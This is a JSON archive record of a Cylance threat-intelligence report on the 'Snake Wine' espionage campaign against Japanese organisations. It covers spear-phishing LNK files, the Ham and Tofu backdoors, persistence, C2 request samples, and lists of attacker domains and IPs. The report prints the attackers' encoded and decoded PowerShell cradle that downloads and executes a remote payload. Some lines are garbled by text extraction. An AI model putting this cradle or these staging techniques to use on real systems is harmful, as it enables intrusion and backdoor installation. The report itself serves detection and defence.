{
    "id": "fafb3f76-277d-4d51-833a-a1f4f5b36cb4",
    "created_at": "2023-01-12T15:10:53.206971Z",
    "updated_at": "2025-03-27T02:17:14.359131Z",
    "deleted_at": null,
    "sha1_hash": "5d5db07b1a3c13b8dc7e3b0499cd29ed0b58d148",
    "title": "2017-02-27 - The Deception Project- A New Japanese-Centric Threat",
    "authors": "",
    "file_creation_date": "2022-05-28T02:08:30Z",
    "file_modification_date": "2022-05-28T02:08:30Z",
    "file_size": 155706,
    "plain_text": "# The Deception Project: A New Japanese-Centric Threat\n\n**cylance.com/en_us/blog/the-deception-project-a-new-japanese-centric-threat.html**\n\nJon Gross\n\nIn an effort to expose a common problem we see happening in the industry, Cylance® would like to shed some light on just how easy it is to\nfake attribution. The key factor we should focus on, as an industry, is determining HOW an attacker can take down an organization, rather than\nfocusing only on the WHO.\n\nOnce we can identify how the attack happened, we can focus on what’s really important – prevention.\n\n## Background\n\nWhile investigating some of the smaller name servers that APT28/Sofacy routinely use to host their infrastructure, Cylance discovered another\nprolonged campaign that appeared to exclusively target Japanese companies and individuals that began around August 2016. The later\nregistration style was eerily close to previously registered APT28 domains, however, the malware used in the attacks did not seem to line up at\n[all. During the course of our investigation, JPCERT published this analysis of one of the group’s backdoors. Cylance tracks this threat group](https://www.jpcert.or.jp/magazine/acreport-ChChes.html)\ninternally as ‘Snake Wine’.\n\nWe found the infrastructure to be significantly larger than documented at the link above. Cylance believes some of the steps taken by the\nattacker could possibly be an attempt at a larger disinformation campaign based upon some of the older infrastructure that would link it to a\nwell-known CN-APT group. Nearly all of the initial data in this case was gathered from delving further into the domains hosted by ’It Itch.’ South\n[Korea’s National Intelligence Service (NIS) previously leveraged It Itch’s services, as documented by Citizen Lab in this post. A number of the](https://citizenlab.org/2015/08/what-we-know-about-the-south-korea-niss-use-of-hacking-teams-rcs/)\nsamples were signed using the leaked code-signing certificate from the Hacking Team breach.\n\n## Propagation and Targeting\n\nTo date, all observed attacks were the result of spear phishing attempts against the victim organizations. The latest batch used well-crafted\nLNK files contained within similarly named password-protected ZIP files. The LNK files, when opened, would execute a PowerShell command\nvia ‘cmd.exe /c’ to download and execute an additional payload. The attackers appeared to prefer the Google URL shortening service\n‘goog.gl,’ however, this could easily change as the attacks evolve.\n\n_powershell.exe -nop –w hidden -exec bypass -enc_\n_“JAAyAD0AJwAtAG4AbwBwACAALQB3ACAAaABpAGQAZABlAG4AIAAtAGUAeABlAGMAIABiAHkAcABhAHMAcwAgAC0AYwAgACIASQBFAF_\n\n**_Figure 1: Encoded PowerShell Cmdlet Contained Within the LNK File_**\n\n_$2='-nop -w hidden -exec bypass -c \"IEX (New-Object_\n\n_System.Net.Webclient).DownloadString(''https://goo(dot)gl/cpT1NW'')\"';if([IntPtr]::Size -eq 8){$3 =_\n\n_$env:SystemRoot + \"\\syswow64\\WindowsPowerShell\\v1.0\\powershell\";iex \"& $3 $2\";}else{iex \"&_\n\n_powershell $2\";}_\n\n**_Figure 2: Decoded PowerShell Snippet_**\n\nThe shortened URL connected to 'hxxxp://koala (dot) acsocietyy (dot) com/acc/image/20170112001 (dot) jpg.' This file was in fact another\n[piece of PowerShell code modified from ‘PowerSploit'. That file opens a decoy document and executes an approximately 60kb chunk of](https://github.com/PowerShellMafia/PowerSploit)\nposition independent shellcode. The shellcode upon further decoding and analysis is nearly identical to what Cylance calls ‘The Ham\nBackdoor’ below. This particular variant of the backdoor references itself internally as version ‘1.6.4’ and beaconed to ‘gavin (dot) ccfchrist\n(dot) com.’\n\nThe move to a shellcode-based backdoor was presumably done to decrease overall AV detection and enable deployment via a wider array of\n[methods. A public report released here documented a similar case in which several universities were targeted by an email purporting to be](https://csirt.ninja/?p=1103)\nfrom The Japanese Society for the Promotion of Science ‘jsps (dot) go (dot) jp’ regarding the need to renew grant funding. The website ‘koala\n(dot) asocietyy (dot) com’ was also used to host the following PowerShell payloads:\n\nae0dd5df608f581bbc075a88c48eedeb7ac566ff750e0a1baa7718379941db86 20170112003.jpg\n75ef6ea0265d2629c920a6a1c0d1dd91d3c0eda86445c7d67ebb9b30e35a2a9f 20170112002.jpg\n723983883fc336cb575875e4e3ff0f19bcf05a2250a44fb7c2395e564ad35d48 20170112007.jpg\n3d5e3648653d74e2274bb531d1724a03c2c9941fdf14b8881143f0e34fe50f03 20170112005.jpg\n471b7edbd3b344d3e9f18fe61535de6077ea9fd8aa694221529a2ff86b06e856 20170112.jpg\n4ff6a97d06e2e843755be8697f3324be36e1ebeb280bb45724962ce4b6710297 20170112001.jpg\n9fbd69da93fbe0e8f57df3161db0b932d01b6593da86222fabef2be31899156d 20170112006.jpg\nf45b183ef9404166173185b75f2f49f26b2e44b8b81c7caf6b1fc430f373b50b 20170112008.jpg\n646f837a9a5efbbdde474411bb48977bff37abfefaa4d04f9fb2a05a23c6d543 20170112004.jpg\n\n\n-----\n\ne pay oads co ta ed t eac o e S e sc pt beaco ed to t e sa e do a a e, t t e e cept o o 0 0 008 jpg, c\nbeaconed to ‘hamiltion (dot) catholicmmb (dot) com.’\n\nEarlier attempts used EXE’s disguised with Microsoft Word document icons and DOCX files within a similarly named ZIP file as documented by\nJPCERT. Cylance has observed the following ZIP files which contained a similarly named executable:\n\n平成29年日米安保戦略対話提言(未定稿).zip\n2016県立大学シンポジウムA4＿1025.zip\n日米関係重要事項一覧表.zip\nロシア歴史協会の設立と「単一」国史教科書の作成.zip\n日米拡大抑止協議.zip\n個人番号の提供について.zip\n11月新学而会.zip\n\n## Malware\n\n**The Ham Backdoor**\n\nThe Ham Backdoor functions primarily as a modular platform, which provides the attacker with the ability to directly download additional\nmodules and execute them in memory from the command and control (C2) server. The backdoor was programmed in C++ and compiled using\nVisual Studio 2015. The modules that Cylance has observed so far provided the ability to:\n\nUpload specific files to the C2\nDownload a file to the infected machine\nLoad and execute a DLL payload\nList running processes and services\nExecute a shell command\nAdd an additional layer of AES encryption to the network protocol\nSearch for a keyword in files\n\nLegacy AV appears to have fairly good coverage for most of the samples; however, minor changes in newer samples have considerably lower\ndetection rates. JPCERT calls this backdoor ‘ChChes’ for cross-reference. The malware employs a number of techniques for obfuscation, such\nas stack construction of variables and data, various XOR encodings and data reordering schemes, and some anti-analysis techniques.\nPerhaps the most interesting of these, and the one we’ve chosen to key on from a detection perspective, is the following bit of assembly which\nwas the final component in decoding a large encoded block of code:\n\nlea   edx, [esi+edi]\n\nmov   edi, [ebp+var_4]\n\nmov   cl, [ecx+edx]\n\nxor   cl, [eax+edi]\n\ninc   eax\n\nmov   edi, [ebp+arg_8]\n\nmov   [edx], cl\n\nmov   ecx, [ebp+arg_0]\n\ncmp   eax, ebx\n\nThis snippet in the analyzed samples used a fixed size XOR key usually 0x66 bytes long but would sequentially XOR every byte by each value\nof the key. This effectively results in a single byte XOR by the end of the operation. This operation made little sense in comparison to the other\nmore complicated reordering and longer XOR encodings used prior to this mechanism. Cylance only found two variants to this code-block,\nhowever, that could be easily modified by the attacker in the future. The code also makes extensive use of the multi-byte NOP operation\nprefixed by 0x0F1F. These operations present somewhat of a problem for older disassemblers such as the original Ollydbg, but are trivially\npatched.\n\nThe network protocol of the backdoor is well described by JPCERT, but Cylance has taken the liberty to clean up their original python snippet,\nwhich was provided for decoding the cookie values:\n\n\n-----\n\n_import hashlib_\n\n_from Crypto.Cipher import ARC4_\n\n_def network_decode(cookie_data):_\n\n_data_list = cookie_data.split (';')_\n\n_dec = []_\n\n_for i in range(len(data_list)):_\n\n_tmp = data_list[i]_\n\n_pos = tmp.find(\"=\")_\n\n_key = tmp[0:pos]_\n\n_val = tmp[pos:]_\n\n_md5 = hashlib.md5()_\n\n_md5.update(key)_\n\n_rc4key = md5.hexdigest()[8:24]_\n\n_rc4 = ARC4.new(rc4key)_\n\n_dec.append(rc4.decrypt(val.decode(\"base64\"))[len(key):])_\n\n_print (\"[*] decoded:\" + \"\" .join (dec))_\n\n**_Figure 3: Cleaned Script Originally by JPCERT_**\n\nAs noted in the JPCERT report, Cylance also found that in most cases of successful infection, one of the earliest modules downloaded onto\nthe system added an additional layer of AES communication to the traffic. The backdoor would also issue anomalous HTTP requests with the\nmethod ‘ST’ in the event that the C2 server did not respond appropriately to the initial request.\n\nAn example request is shown below:\n\n_ST /2C/H.htm HTTP/1.1_\n\n_Cookie: uQ=_\n\n_[REDACTED];omWwFSA=hw4biTXvqd%2FhK2TIyoLYj1%2FShw6MhEGHlWurHsUyekeuunmop4kZ;Tgnfm5E=RPBaxi%2Bf4B2r6CTd9jh5u3AH_\n_Accept: */*_\n\n_User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET_\n\n_CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 1.1.4322)_\n\n_Host: kawasaki.unhamj(dot)com_\n\n_Content-Length: 0_\n\n_Connection: Keep-Alive_\n\n_Cache-Control: no-cache_\n\n**_Figure 4: Example Request Using the ‘ST’ Method_**\n\n[The majority of the Ham Backdoors found to date have all been signed using the stolen and leaked Hacking Team code-signing certificate.](http://www.hackingteam.it/)\n\n**‘HT Srl’ Certificate Details:**\n\n**Status: Revoked**\n\n**Issuer: VeriSign Class 3 Code Signing 2010 CA**\n\n**Valid: 1:00 AM 8/5/2011 to 12:59 AM 8/5/2012**\n\n**Thumbprint: B366DBE8B3E81915CA5C5170C65DCAD8348B11F0**\n\n**Serial Number: 3F FC EB A8 3F E0 0F EF 97 F6 3C D9 2E 77 EB B9**\n\nWhy the attackers chose to use this expired certificate to sign their malware samples is unknown. The malware itself bears little resemblance\nto previous hacking team implants and was likely done purely as an attempt to throw off attribution. The only observed persistence method to\ndate is the use of the standard Windows Run key ‘SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run’ under either a user’s hive or HKLM.\nCylance found that the following three full file paths were commonly used by this particular backdoor:\n\n%AppData%\\Reader.exe\n%AppData%\\Notron.exe\n%AppData%\\SCSI_Initiarot.exe\n\nCylance also identified an earlier sample, which took advantage of a self-extracting RAR and a side loading vulnerability in the legitimate\nMicrosoft Resource Compiler, ‘RC.exe.’ RC.exe will load the DLL ‘RCDLL.dll’ via its import table. This modified DLL was responsible for XOR\ndecoding and mapping the shellcode version of the Ham Backdoor. This particular sample was stored in a file called ‘RC.cfg’, which was\nencoded using a single byte XOR against the key of 0x54. It appears that this version was only used in early campaigns, as the latest\nreferenced backdoor version Cylance identified was ‘v1.2.2.’\n\n## Tofu Backdoor\n\nBased upon Cylance’s observations, the Tofu Backdoor was deployed in far fewer instances than the Ham Backdoor. It is a proxy-aware, fullyfeatured backdoor programmed in C++ and compiled using Visual Studio 2015. The Tofu backdoor makes extensive use of threading to\nperform individual tasks within the code. It communicates with its C2 server through HTTP over nonstandard TCP ports, and will send encoded\n\n\n-----\n\no at o co ta g bas c syste o at o bac, c ud g ost a e, use a e, a d ope at g syste t t e co te t o t e OS\n\n_POST /586E32A1FFFFFFFF.aspx HTTP/1.1_\n_Accept: */*_\n_Cookies: Sym1.0: 0_\n_,Sym2.0: 0_\n_,Sym3.0: 61456_\n_,Sym4.0: 1_\n_Host: area.wthelpdesk.com:443_\n_Content-Length: 39_\n_Connection: Keep-Alive_\n_Cache-Control: no-cache_\n\n**_Figure 5: Example POST Request From the Tofu Backdoor_**\n\nAlthough communication took place on TCP port 443, none of the traffic was encrypted and the custom cookies ‘Sym1.0’ – ‘Sym4.0’ can be\nused to easily identify the backdoor in network traffic. The backdoor has the ability to enumerate processor, memory, drive, and volume\ninformation, execute commands directly from the attacker, enumerate and remove files and folders, and upload and download files.\nCommands were sent by the C2 and processed by the backdoor in the form of encoded DWORDs, each correspondeding to a particular action\nlisted above. Tofu may also create two different bi-directional named pipes on the system ‘\\\\.\\pipe\\1[12345678]’ and ‘\\\\.\\pipe\\2[12345678]’\nwhich could be accessed via other compromised machines on the internal network.\n\nDuring an active investigation, the file was found at ‘%AppData%\\iSCSI_Initiarot.exe’. This path was confirmed as a static location in the code\nthat the backdoor would use to copy itself. A static Run key was also used by the backdoor to establish persistence on the victim machine\n(HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Microsoft iSCSI Initiator).\n\nAll of the samples Cylance identified were compiled in November 2016, so these backdoors may have simply been tests as later samples\nmoved back to the shellcode-based Ham Backdoors. The backdoors were also similarly signed using the same stolen code-signing certificate\nfrom ‘HT Srl.’\n\n## C2 Infrastructure\n\nCylance found that at least half of the infrastructure associated with The Deception Project appeared to be dark or at least unused. This\nsuggests that the Snake Wine group will likely continue to escalate their activity and persistently target both private and government entities\nwithin Japan.\n\nCylance also found an extensive network of Dynamic DNS (DDNS) domains registered via multiple free providers was likely being used by the\nsame group. However, Cylance was unable to identify any current samples which communicated with this infrastructure, and have\nsubsequently separated this activity from the rest of the attacker’s infrastructure. Many of the DDNS domains were concocted to mimic\nlegitimate windows update domains such as ‘download.windowsupdate(dot)com’, ‘ipv4.windowsupdate(dot)com’, and\n‘v4.windowsupdate(dot)com’.\n**Domain Registration Information:**\n\n8/19/16      wchildress(dot)com                 abellonav.poulsen(at)yandex.com\n\n8/19/16      poulsenv(dot)com                  abellonav.poulsen(at)yandex.com\n\n8/19/16      toshste(dot)com                    toshsteffensen2(at)yandex.com\n\n9/6/16       shenajou(dot)com                  ShenaJouellette(at)india.com\n\n9/6/16       ixrayeye(dot)com                   BettyWBatts(at)india.com\n\n9/12/16      wthelpdesk(dot)com                 ArmandOValcala(at)india.com\n\n9/12/16      bdoncloud(dot)com                  GloriaRPaige(at)india.com\n\n9/12/16      belowto(dot)com                   RobertoRivera(at)india.com\n\n11/3/16      incloud-go(dot)com                  RufinaRWebb(at)india.com\n\n11/3/16      unhamj(dot)com                   JuanitaRDunham(at)india.com\n\n11/3/16      cloud-maste(dot)com                MeganFDelgado(at)india.com\n\n11/4/16      cloud-kingl(dot)com                 ElisabethBGreen(at)india.com\n\n11/4/16      incloud-obert(dot)com                RobertJButler(at)india.com\n\n12/6/16      fftpoor(dot)com                     SteveCBrown(at)india.com\n\n12/6/16      ccfchrist(dot)com                    WenonaTMcMurray(at)india.com\n\n12/7/16      catholicmmb(dot)com                 EmilyGLessard(at)india.com\n\n12/7/16      usffunicef(dot)com                   MarisaKParr(at)india.com\n\n12/7/16      cwiinatonal(dot)com                 RobertMKnight(at)india.com\n\n12/7/16      tffghelth(dot)com                   NathanABecker(at)india.com\n\n12/7/16      acsocietyy(dot)com                  PearlJBrown(at)india.com\n\n12/8/16      tokyo-gojp(dot)com                  VeraTPerkins(at)india.com\n\n12/8/16      salvaiona(dot)com                   DeborahAStutler(at)india.com\n\n12/8/16      osaka-jpgo(dot)com                  JudithAMartel(at)india.com\n\n\n-----\n\n/8/ 6 tyoto go jp(dot)co eta o a (at) d a co\n12/8/16      fastmail2(dot)com                   ClementBCarico(at)india.com\n12/11/16     wcwname(dot)com                   CynthiaRNickerson(at)india.com\n12/12/16     dedgesuite(dot)net                   KatherineKTaggart(at)india.com\n12/12/16     wdsupdates(dot)com                  GordonESlavin(at)india.com\n12/12/16     nsatcdns(dot)com                    SarahNBosch(at)india.com\n12/13/16     vscue(dot)com                      ChrisTDawkins(at)india.com\n12/13/16     sindeali(dot)com                     DonnaJMcCray(at)india.com\n12/13/16     vmmini(dot)com                     RaymondRKimbrell(at)india.com\n12/20/16     u-tokyo-ac-jp(dot)com                 LynnJOwens(at)india.com\n12/21/16     meiji-ac-jp(dot)com                   PearlJPoole(at)india.com\n12/26/16     jica-go-jp(dot)bike                    AliceCLopez(at)india.com\n12/27/16     mofa-go-jp(dot)com                   AngelaJBirkholz(at)india.com\n12/27/16     jimin-jp(dot)biz                      EsmeraldaTYates(at)india.com\n12/27/16     jica-go-jp(dot)biz                     RonaldSFreeman(at)india.com\n2/9/17       jpcert(dot)org                      GinaKPiller(at)india.com\n2/14/2017   ijica(dot)in                          DarrenMCrow(at)india.com\n2/17/2017   chibashiri(dot)com                    WitaTBiles(at)india.com\n2/17/2017   essashi(dot)com                      CarlosBPierson(at)india.com\n2/17/2017   urearapetsu(dot)com                  IvoryDStallcup(at)india.com\n\n**Full Domain List:**\n\narea.wthelpdesk(dot)com\ncdn.incloud-go(dot)com\ncenter.shenajou(dot)com\ncommissioner.shenajou(dot)com\ndevelopment.shenajou(dot)com\ndick.ccfchrist(dot)com\ndocument.shenajou(dot)com\ndownload.windowsupdate.dedgesuite(dot)net\nedgar.ccfchrist(dot)com\newe.toshste(dot)com\nfabian.ccfchrist(dot)com\nflea.poulsenv(dot)com\nfoal.wchildress(dot)com\nfukuoka.cloud-maste(dot)com\ngavin.ccfchrist(dot)com\nglicense.shenajou(dot)com\nhamiltion.catholicmmb(dot)com\nhukuoka.cloud-maste(dot)com\nimages.tyoto-go-jp(dot)com\ninterpreter.shenajou(dot)com\njames.tffghelth(dot)com\nkawasaki.cloud-maste(dot)com\nkawasaki.unhamj(dot)com\nkennedy.tffghelth(dot)com\nlennon.fftpoor(dot)com\nlicense.shenajou(dot)com\nlion.wchildress(dot)com\nlizard.poulsenv(dot)com\nmalcolm.fftpoor(dot)com\nms.ecc.u-tokyo-ac-jp(dot)com\nmsn.incloud-go(dot)com\nsakai.unhamj(dot)com\nsappore.cloud-maste(dot)com\nsapporo.cloud-maste(dot)com\nscorpion.poulsenv(dot)com\nshrimp.bdoncloud(dot)com\nsindeali(dot)com\nstyle.u-tokyo-ac-jp(dot)com\ntrout.belowto(dot)com\nukuoka.cloud-maste(dot)com\nv4.windowsupdate.dedgesuite(dot)net\n\n\n-----\n\n(dot)co\nwhale.toshste(dot)com\nwindowsupdate.dedgesuite(dot)net\nwindowsupdate.wcwname(dot)com\nwww.cloud-maste(dot)com\nwww.foal.wchildress(dot)com\nwww.fukuoka.cloud-maste(dot)com\nwww.incloud-go(dot)com\nwww.kawasaki.cloud-maste(dot)com\nwww.kawasaki.unhamj(dot)com\nwww.lion.wchildress(dot)com\nwww.msn.incloud-go(dot)com\nwww.sakai.unhamj(dot)com\nwww.sapporo.cloud-maste(dot)com\nwww.unhamj(dot)com\nwww.ut-portal-u-tokyo-ac-jp.tyoto-go-jp(dot)com\nwww.vmmini(dot)com\nwww.wchildress(dot)com\nwww.yahoo.incloud-go(dot)com\nyahoo.incloud-go(dot)com\nzebra.bdoncloud(dot)com\nzebra.incloud-go(dot)com\nzebra.wthelpdesk(dot)com\n\n**IP Addresses:**\n\n107.181.160.109\n109.237.108.202\n151.101.100.73\n151.236.20.16\n158.255.208.170\n158.255.208.189\n158.255.208.61\n160.202.163.79\n160.202.163.82\n160.202.163.90\n160.202.163.91\n169.239.128.143\n185.117.88.81\n185.133.40.63\n185.141.25.33\n211.110.17.209\n31.184.198.23\n31.184.198.38\n92.242.144.2\n\n## Anomalous IP Crossover\n\nOne of the most perplexing aspects of tracing the infrastructure associated with this particular campaign is that it appeared to lead to a\nsignificant number of well-known ‘MenuPass’/ ‘Stone Panda’ domains. MenuPass is a well-documented CN-APT group, whose roots go back\n[to 2009. The group was first publicly disclosed by FireEye in this report. However, many of those domains were inactive for as long as two](https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-poison-ivy.pdf)\nyears and could have easily been re-registered by another entity looking to obfuscate attribution.\n\nAs a result, we’ve only included recent Dynamic DNS domains that were connected to recently registered infrastructure. A much larger\ncollection of information is available to trusted and interested parties. Please contact us at: deceptionproject (at) Cylance [dot] com.\n**Dynamic DNS IPs:**\n\n37.235.52.18                2016-05-11\n\n78.153.151.222              2016-05-13\n\n175.126.148.111             2016-07-14\n\n95.183.52.57                2016-07-26\n\n109.237.108.202             2016-12-26\n\n109.248.222.85              2016-12-27\n\n**Dynamic DNS Domains:**\n\n\n-----\n\nb aaaaaaaaaaaa do supdate(dot)3 a et\ncontract.4mydomain(dot)com\ncontractus.qpoe(dot)com\nctdl.windowsupdate.itsaol(dot)com\nctldl.microsoftupdate.qhigh(dot)com\nctldl.windowsupdate.authorizeddns(dot)org\nctldl.windowsupdate.authorizeddns(dot)us\nctldl.windowsupdate.dnset(dot)com\nctldl.windowsupdate.lflinkup(dot)com\nctldl.windowsupdate.x24hr(dot)com\ndownload.windowsupdate.authorizeddns(dot)org\ndownload.windowsupdate.dnset(dot)com\ndownload.windowsupdate.itsaol(dot)com\ndownload.windowsupdate.lflinkup(dot)com\ndownload.windowsupdate.x24hr(dot)com\nea.onmypc(dot)info\neu.wha(dot)la\nfeed.jungleheart(dot)com\nfire.mrface(dot)com\nfuck.ikwb(dot)com\nglobalnews.wikaba(dot)com\nhelpus.ddns(dot)info\nhome.trickip(dot)org\nimap.dnset(dot)com\nipv4.windowsupdate.3-a(dot)net\nipv4.windowsupdate.authorizeddns(dot)org\nipv4.windowsupdate.dnset(dot)com\nipv4.windowsupdate.fartit(dot)com\nipv4.windowsupdate.lflink(dot)com\nipv4.windowsupdate.lflinkup(dot)com\nipv4.windowsupdate.mylftv(dot)com\nipv4.windowsupdate.x24hr(dot)com\nlatestnews.organiccrap(dot)com\nmicrosoftmirror.mrbasic(dot)com\nmicrosoftmusic.itemdb(dot)com\nmicrosoftstore.onmypc(dot)net\nmicrosoftupdate.qhigh(dot)com\nmobile.2waky(dot)com\nmseupdate.ourhobby(dot)com\nnewsreport.justdied(dot)com\nnmrx.mrbonus(dot)com\noutlook.otzo(dot)com\nreferred.gr8domain(dot)biz\ntwx.mynumber(dot)org\nv4.windowsupdate.authorizeddns(dot)org\nv4.windowsupdate.dnset(dot)com\nv4.windowsupdate.itsaol(dot)com\nv4.windowsupdate.lflinkup(dot)com\nv4.windowsupdate.x24hr(dot)com\nvisualstudio.authorizeddns(dot)net\nwindowsupdate.2waky(dot)com\nwindowsupdate.3-a(dot)net\nwindowsupdate.acmetoy(dot)com\nwindowsupdate.authorizeddns(dot)net\nwindowsupdate.authorizeddns(dot)org\nwindowsupdate.dns05(dot)com\nwindowsupdate.dnset(dot)com\nwindowsupdate.esmtp(dot)biz\nwindowsupdate.ezua(dot)com\nwindowsupdate.fartit(dot)com\nwindowsupdate.itsaol(dot)com\nwindowsupdate.lflink(dot)com\nwindowsupdate.mrface(dot)com\nwindowsupdate mylftv(dot)com\n\n\n-----\n\ndo supdate (dot)co\nwww.contractus.qpoe(dot)com\nwww.feed.jungleheart(dot)com\nwww.helpus.ddns(dot)info\nwww.latestnews.organiccrap(dot)com\nwww.microsoftmirror.mrbasic(dot)com\nwww.microsoftmusic.itemdb(dot)com\nwww.microsoftstore.onmypc(dot)net\nwww.mobile.2waky(dot)com\nwww.mseupdate.ourhobby(dot)com\nwww.nmrx.mrbonus(dot)com\nwww.twx.mynumber(dot)org\nwww.visualstudio.authorizeddns(dot)net\nwww.windowsupdate.acmetoy(dot)com\nwww.windowsupdate.authorizeddns(dot)net\nwww.windowsupdate.authorizeddns(dot)org\nwww.windowsupdate.dnset(dot)com\nwww.windowsupdate.itsaol(dot)com\nwww.windowsupdate.x24hr(dot)com\nwww2.qpoe(dot)com\nwww2.zyns(dot)com\nwww2.zzux(dot)com\n\n## Conclusion\n\nThe Snake Wine group has proven to be highly adaptable and has continued to adopt new tactics in order to establish footholds inside victim\nenvironments. The exclusive interest in Japanese government, education, and commerce will likely continue into the future as the group is just\nstarting to build and utilize their existing current attack infrastructure.\n\nIf the past is an accurate indicator, attacks will continue to escalate in both skill and intensity as the attackers implement new tactics in\nresponse to defenders acting on previously released information.\n\nPerhaps the most interesting aspect of the Snake Wine group is the number of techniques used to obscure attribution. Signing the malware\nwith a stolen and subsequently publicly leaked code-signing certificate is sloppy even for well-known CN-APT groups. Also of particular\ninterest from an attribution obfuscation perspective is direct IP crossover with previous Dynamic DNS domains associated with known CN-APT\nactivity. A direct trail was established over a period of years that would lead competent researchers to finger CN operators as responsible for\nthis new activity as well.\n\nAlthough the MenuPass Group used mostly publicly available RATs, they were successful in penetrating a number of high value targets, so it is\nentirely possible this is indeed a continuation of past activity. However, Cylance does not believe this scenario to be probable, as a significant\namount of time has elapsed between the activity sets. Also of particular interest was the use of a domain hosting company that accepts BTC\nand was previously heavily leveraged by the well-known Russian group APT28.\nIn any case, Cylance hopes to better equip defenders to detect and respond to active threats within their network and enable the broader\nsecurity community to respond to similar threats. In terms of defending and responding to malware, attribution is rarely important. As new\nmethodologies become more broadly detected, threat actors will continue to embrace alternate and new strategies to continue achieving their\nobjectives.\n\n## Yara Rules\n\n[Yara rules for this campaign can be found on GitHub here: https://github.com/CylanceSPEAR/IOCs/blob/master/snake.wine.yar](https://github.com/CylanceSPEAR/IOCs/blob/master/snake.wine.yar)\n\n_[If you use our endpoint protection product, CylancePROTECT®, you were](https://www.cylance.com/en_us/products/our-products/protect.html)_ _[already protected from this attack. If you don't have](https://threatvector.cylance.com/en_us/home/cylance-vs-the-deception-project.html)_\n_CylancePROTECT,_ _[contact us to learn how our AI based solution can predict and prevent unknown and emerging threats.](https://www.cylance.com/en_us/contact-us.html)_\n\nJon Gross\n\n## About Jon Gross\n\nDirector of Threat Intelligence at Cylance\n\nJon Gross is the Director of Threat Intelligence at Cylance.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2017/2017-02-27 - The Deception Project- A New Japanese-Centric Threat.pdf"
    ],
    "report_names": [
        "2017-02-27 - The Deception Project- A New Japanese-Centric Threat.pdf"
    ],
    "threat_actors": [
        {
            "id": "a3687241-9876-477b-aa13-a7c368ffda58",
            "created_at": "2022-10-25T16:07:24.496902Z",
            "updated_at": "2025-03-27T02:02:10.256629Z",
            "deleted_at": null,
            "main_name": "Hacking Team",
            "aliases": [],
            "source_name": "ETDA:Hacking Team",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "029f7e65-fec8-481e-a7ef-9b5e53ef2371",
            "created_at": "2023-01-06T13:46:38.674255Z",
            "updated_at": "2025-03-27T02:00:02.88902Z",
            "deleted_at": null,
            "main_name": "Snake Wine",
            "aliases": [],
            "source_name": "MISPGALAXY:Snake Wine",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e90c06e4-e3e0-4f46-a3b5-17b84b31da62",
            "created_at": "2023-01-06T13:46:39.018236Z",
            "updated_at": "2025-03-27T02:00:02.978356Z",
            "deleted_at": null,
            "main_name": "Hacking Team",
            "aliases": [],
            "source_name": "MISPGALAXY:Hacking Team",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ec14074c-8517-40e1-b4d7-3897f1254487",
            "created_at": "2023-01-06T13:46:38.300905Z",
            "updated_at": "2025-03-27T02:00:02.799108Z",
            "deleted_at": null,
            "main_name": "APT10",
            "aliases": [
                "TA429",
                "STONE PANDA",
                "POTASSIUM",
                "Red Apollo",
                "HOGFISH",
                "Cloud Hopper",
                "BRONZE RIVERSIDE",
                "ATK41",
                "G0045",
                "Menupass Team",
                "happyyongzi",
                "CVNX",
                "Granite Taurus"
            ],
            "source_name": "MISPGALAXY:APT10",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "42a7c8ec-e6f6-4460-9ad4-0ca2d3210135",
            "created_at": "2022-10-25T16:07:24.203518Z",
            "updated_at": "2025-03-27T02:02:10.139428Z",
            "deleted_at": null,
            "main_name": "Snake Wine",
            "aliases": [],
            "source_name": "ETDA:Snake Wine",
            "tools": [
                "ChChes",
                "HAYMAKER",
                "Ham Backdoor",
                "Tofu Backdoor"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "ba3fff0c-3ba0-4855-9eeb-1af9ee18136a",
            "created_at": "2022-10-25T15:50:23.298889Z",
            "updated_at": "2025-03-27T02:00:55.433541Z",
            "deleted_at": null,
            "main_name": "menuPass",
            "aliases": [
                "menuPass",
                "POTASSIUM",
                "Stone Panda",
                "APT10",
                "Red Apollo",
                "CVNX",
                "HOGFISH",
                "BRONZE RIVERSIDE"
            ],
            "source_name": "MITRE:menuPass",
            "tools": [
                "certutil",
                "FYAnti",
                "UPPERCUT",
                "SNUGRIDE",
                "P8RAT",
                "RedLeaves",
                "SodaMaster",
                "pwdump",
                "Mimikatz",
                "PlugX",
                "PowerSploit",
                "ChChes",
                "cmd",
                "QuasarRAT",
                "AdFind",
                "Cobalt Strike",
                "PoisonIvy",
                "EvilGrab",
                "esentutl",
                "Impacket",
                "Ecipekac",
                "PsExec",
                "HUI Loader"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "ba9fa308-a29a-4928-9c06-73aafec7624c",
            "created_at": "2024-05-01T02:03:07.981061Z",
            "updated_at": "2025-03-27T02:05:17.28602Z",
            "deleted_at": null,
            "main_name": "BRONZE RIVERSIDE",
            "aliases": [
                "CTG-5938 ",
                "CVNX ",
                "Hogfish ",
                "MenuPass ",
                "POTASSIUM ",
                "Red Apollo ",
                "Stone Panda ",
                "APT10 "
            ],
            "source_name": "Secureworks:BRONZE RIVERSIDE",
            "tools": [
                " ChChes",
                " Cobalt Strike",
                " PlugX",
                " PoisonIvy",
                " QuasarRAT",
                " QuasarRAT Loader",
                " RedLeaves",
                "ANEL"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "e3767160-695d-4360-8b2e-d5274db3f7cd",
            "created_at": "2022-10-25T16:47:55.914348Z",
            "updated_at": "2025-03-27T02:05:17.411172Z",
            "deleted_at": null,
            "main_name": "IRON TWILIGHT",
            "aliases": [
                "ATK5 ",
